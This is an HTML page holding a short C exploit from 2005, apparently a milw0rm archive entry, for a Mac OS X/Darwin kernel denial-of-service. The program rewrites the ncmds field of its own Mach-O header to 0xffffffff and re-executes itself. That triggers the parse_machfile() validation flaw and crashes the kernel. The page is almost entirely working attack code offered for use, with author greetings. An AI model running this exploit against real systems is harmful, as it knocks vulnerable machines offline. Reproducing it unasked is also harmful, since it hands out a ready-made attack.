<html><head><title>Mac OS X <= 10.3.7 Input Validation Flaw parse_machfile() DoS</title></head><pre>/*
* DoS for Darwin Kernel Version &lt; 7.5.0
* -(nemo pulltheplug org)-
* 2005
*
* greetz to awnex, cryp, nt, andrewg, arc, mercy, amnesia ;)
* irc.pulltheplug.org (#social)
*/


#include &lt;stdio.h&gt;

int main( int ac, char * * av )
{
  FILE * me;
  int rpl = 0xffffffff;
  fpos_t pos = 0x10;
  printf( &quot;-( nacho - 2004 DoS for OSX (darwin &lt; 7.5.0 )-\n&quot; );
  printf( &quot;-( nemo pulltheplug org )-\n\n&quot; );
  printf( &quot;[+] Opening file for writing.\n&quot; );
  if ( !( me = fopen( * av, &quot;r+&quot; ) ) )
  {
    printf( &quot;[-] Error opening exe.\n&quot; );
    exit( 1 );
  }
  printf( &quot;[+] Seeking to ncmds.\n&quot; );
  if ( ( fsetpos( me, &amp; pos ) ) == -1 )
  {
    printf( &quot;[-] Error seeking to ncmds.\n&quot; );
    exit( 1 );
  }
  printf( &quot;[+] Changing ncmds to 0x%x.\n&quot;, rpl );
  if ( fwrite( &amp; rpl, 4, 1, me ) &lt; 1 )
  {
    printf( &quot;[-] Error writing to file.\n&quot; );
    exit( 1 );
  }
  fclose( me );
  printf( &quot;[+] Re-executing with modified mach-o header.\n&quot; );
  sleep( 5 );
  if ( execv( * av, av ) == -1 )
  {
    printf( &quot;[-] Error executing %s, please run manually.\n&quot;, * av );
    exit( 1 );
  }
  exit( 0 ); // hrm
}

// milw0rm.com [2005-01-20]</pre></html>